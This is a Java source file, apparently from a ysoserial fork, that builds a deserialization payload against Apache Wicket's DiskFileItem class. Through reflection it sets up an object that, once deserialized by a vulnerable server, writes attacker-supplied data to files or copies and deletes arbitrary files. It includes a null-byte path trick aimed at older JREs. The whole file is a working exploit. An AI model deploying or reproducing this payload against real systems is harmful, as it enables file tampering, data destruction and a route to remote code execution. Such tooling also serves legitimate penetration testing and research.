package ysoserial.payloads.tabbyGadgetChains.Wicket;


import java.io.File;
import java.io.IOException;
import java.io.OutputStream;
import java.util.Arrays;

import org.apache.commons.codec.binary.Base64;
import org.apache.wicket.util.upload.DiskFileItem;
import org.apache.wicket.util.io.DeferredFileOutputStream;
import org.apache.wicket.util.io.ThresholdingOutputStream;

import ysoserial.payloads.ReleaseableObjectPayload;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;


/**
 * DiskFileItem.readObject()
 * file.delete()
 */
public class Poc2 implements ReleaseableObjectPayload<DiskFileItem> {

    public DiskFileItem getObject(String command) throws Exception {

        String[] parts = command.split(";");

        if (parts.length != 3) {
            throw new IllegalArgumentException("Bad command format.");
        }

        if ("copyAndDelete".equals(parts[0])) {
            return copyAndDelete(parts[1], parts[2]);
        }
        else if ("write".equals(parts[0])) {
            return write(parts[1], parts[2].getBytes("US-ASCII"));
        }
        else if ("writeB64".equals(parts[0]) ) {
            return write(parts[1], Base64.decodeBase64(parts[2]));
        }
        else if ("writeOld".equals(parts[0]) ) {
            return writeOldJRE(parts[1], parts[2].getBytes("US-ASCII"));
        }
        else if ("writeOldB64".equals(parts[0]) ) {
            return writeOldJRE(parts[1], Base64.decodeBase64(parts[2]));
        }
        throw new IllegalArgumentException("Unsupported command " + command + " " + Arrays.toString(parts));
    }

    public void release(DiskFileItem obj) throws Exception {
    }

    private static DiskFileItem copyAndDelete ( String copyAndDelete, String copyTo ) throws IOException, Exception {
        return makePayload(0, copyTo, copyAndDelete, new byte[1]);
    }

    // writes data to a random filename (update_<per JVM random UUID>_<COUNTER>.tmp)
    private static DiskFileItem write ( String dir, byte[] data ) throws IOException, Exception {
        return makePayload(data.length + 1, dir, dir + "/whatever", data);
    }

    // writes data to an arbitrary file
    private static DiskFileItem writeOldJRE(String file, byte[] data) throws IOException, Exception {
        return makePayload(data.length + 1, file + "\0", file, data);
    }

    private static DiskFileItem makePayload(int thresh, String repoPath, String filePath, byte[] data) throws IOException, Exception {
        // if thresh < written length, delete outputFile after copying to repository temp file
        // otherwise write the contents to repository temp file
        File repository = new File(repoPath);
        DiskFileItem diskFileItem = new DiskFileItem("test", "application/octet-stream", false, "test", 100000, repository, null);
        File outputFile = new File(filePath);
        DeferredFileOutputStream dfos = new DeferredFileOutputStream(thresh, outputFile);
        OutputStream os = (OutputStream) Reflections.getFieldValue(dfos, "memoryOutputStream");
        os.write(data);
        Reflections.getField(ThresholdingOutputStream.class, "written").set(dfos, data.length);
        Reflections.setFieldValue(diskFileItem, "dfos", dfos);
        Reflections.setFieldValue(diskFileItem, "sizeThreshold", 0);
        return diskFileItem;
    }
    public static void main ( final String[] args ) throws Exception {
        PayloadRunner.run(ysoserial.payloads.tabbyGadgetChains.Wicket.Poc2.class, args);
    }
}
